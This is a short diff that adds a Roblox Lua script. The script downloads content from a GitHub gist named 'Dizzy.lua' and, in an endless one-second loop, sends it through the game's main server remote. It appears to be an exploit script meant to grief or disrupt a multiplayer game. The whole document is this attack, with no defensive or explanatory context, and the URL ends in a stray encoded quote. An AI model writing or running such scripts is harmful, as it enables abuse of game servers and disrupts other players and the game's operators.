@@ -1,0 +1,5 @@
+local troll = game:HttpGet("https://gist.githubusercontent.com/MP4000/fd7b5d6fa8827c4ec3438ed8165e475d/raw/78a05f29d57d37a07c754ae5430fe60c173cabb2/Dizzy.lua%22)
+
+while task.wait(1.0) do
+workspace.THINGS.REMOTES.MAIN:FireServer("b", troll)
+end
